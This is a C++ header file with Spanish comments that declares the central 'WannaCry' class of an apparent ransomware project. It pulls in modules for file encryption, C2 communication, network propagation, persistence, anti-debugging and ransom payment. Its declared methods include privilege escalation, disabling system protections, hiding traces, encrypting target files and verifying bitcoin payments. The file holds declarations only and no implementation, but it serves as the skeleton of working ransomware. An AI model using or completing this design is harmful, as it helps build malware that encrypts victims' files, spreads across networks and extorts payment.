#ifndef WANNACRY_HPP
#define WANNACRY_HPP

#include <string>
#include <vector>
#include <memory>
#include <mutex>

// Inclusión de las cabeceras de los componentes
#include "encryption/FileEncryptor.hpp"
#include "filesystem/FileScanner.hpp"
#include "network/C2Communication.hpp"
#include "network/Propagator.hpp"
#include "payment/PaymentHandler.hpp"
#include "persistence/Persistence.hpp"
#include "ui/RansomUI.hpp"
#include "utils/KillSwitch.hpp"
#include "utils/Logger.hpp"
#include "utils/SystemInfo.hpp"
#include "utils/AntiDebug.hpp"
#include "core/Config.hpp"

/**
 * @class WannaCry
 * @brief Clase principal que coordina todas las actividades del ransomware.
 *
 * Esta clase implementa el patrón Facade, proporcionando una interfaz simplificada
 * para acceder a los subsistemas complejos que componen el ransomware.
 */
class WannaCry
{
private:
    // Singleton pattern
    static std::unique_ptr<WannaCry> instance;
    static std::mutex instanceMutex;

    // Configuración
    std::string uniqueID;                      // ID único para esta infección
    std::vector<std::string> bitcoinAddresses; // Dirección de pago
    std::vector<std::string> c2Servers;        // Servidores C&C
    int ransomAmount;                          // Cantidad del rescate (USD)
    int timeLimit;                             // Límite de tiempo (horas)
    bool infectionSuccessful;                  // Estado de la infección

    // Componentes principales (uso de inyección de dependencias)
    /*
    std::unique_ptr<FileEncryptor> encryptionEngine;
    std::unique_ptr<FileScanner> fileScanner;
    std::unique_ptr<Propagator> propagationEngine;
    std::unique_ptr<C2Communication> communicationModule;
    std::unique_ptr<PaymentHandler> paymentProcessor;
    std::unique_ptr<Persistence> persistenceManager;
    std::unique_ptr<RansomUI> userInterface;
    std::unique_ptr<KillSwitch> killSwitchChecker;
    std::unique_ptr<Logger> logger;
    std::unique_ptr<SystemInfo> systemInfo;
    std::unique_ptr<AntiDebug> antiDebugger;
    */
    std::unique_ptr<Config> configuration;

    // Mutexes para sincronización
    std::mutex operationMutex;

    // Métodos privados
    WannaCry(); // Constructor privado (Singleton)
    void setupConfiguration();
    bool isAlreadyInfected();
    void createMutex();
    bool disableSystemProtections();
    void monitorPaymentStatus();
    void initializeComponents();

    // Métodos de seguimiento y control
    void trackInfectionMetrics();
    void applyAntiAnalysisTechniques();
    bool attemptPrivilegeEscalation();
    void hideTraces();

public:
    // Singleton accessor
    static WannaCry *getInstance();

    // Destructor
    ~WannaCry();

    // Desactivas copia y asignación
    WannaCry(const WannaCry &) = delete;
    WannaCry &operator=(const WannaCry &) = delete;

    // Métodos principales de operación
    bool initialize();
    bool checkKillSwitch();
    void execute();

    // Métodos de módulo específicos
    bool propagateToNetwork();
    bool encryptTargetFiles();
    bool establishPersistence();
    void displayRansomMessage();

    // Métodos de comunicación
    bool connectToC2();
    void reportStatus();
    bool receiveCommands();

    // Métodos de pago
    bool verifyPayment();
    bool decryptFiles();
    void updatePaymentDeadLine();

    // Métodos de información
    std::string getUniqueID() const;
    int getRemainingTime() const;
    int getCurrentRansomAmount() const;
    std::string getRandomBitcoinAddress() const;

    // Estado de la operación
    bool isOperational() const;
    std::vector<std::string> getEncryptedFilesList() const;

    // Interfaz para plugins y extensiones
    bool registerExternalModule(const std::string &moduleName, void *modulePtr);
    void *getExternalModule(const std::string &moduleName);
};

#endif // WANNACRY_HPP